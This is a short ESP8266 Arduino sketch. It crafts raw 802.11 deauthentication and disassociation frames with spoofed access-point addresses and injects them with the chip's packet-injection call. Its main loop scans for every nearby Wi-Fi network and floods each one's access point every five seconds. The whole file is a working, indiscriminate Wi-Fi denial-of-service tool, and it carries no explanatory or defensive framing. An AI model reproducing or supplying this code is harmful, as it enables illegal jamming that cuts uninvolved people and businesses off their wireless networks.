// includes
#include "ESP8266WiFi.h"

// total packet bytes 
uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

// function for sending packets 
bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {
    wifi_set_channel(wifi_channel);
    bool sent = false;
    for (int i = 0; i < tries && !sent; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

    return sent;
}

// main deauth function
bool deauthDevice(uint8_t* mac, uint8_t wifi_channel) {
    bool success = false;
    memcpy(&packet[10], mac, 6);
    memcpy(&packet[16], mac, 6);

    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }

    // send disassociate frame
    packet[0] = 0xa0;

    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }

    return success;
}


// setup function
void setup() {
  Serial.begin(115200);
}

// loop function for keep on sending the packets for the wifi network 
void loop() {
  int networksListSize = WiFi.scanNetworks();

  for(int i = 0; i < networksListSize; i++){
    Serial.println(WiFi.SSID(i) + " " + WiFi.RSSI(i));
    deauthDevice(WiFi.BSSID(i), WiFi.channel(i));
  }
  
  Serial.println("");
  delay(5000);
}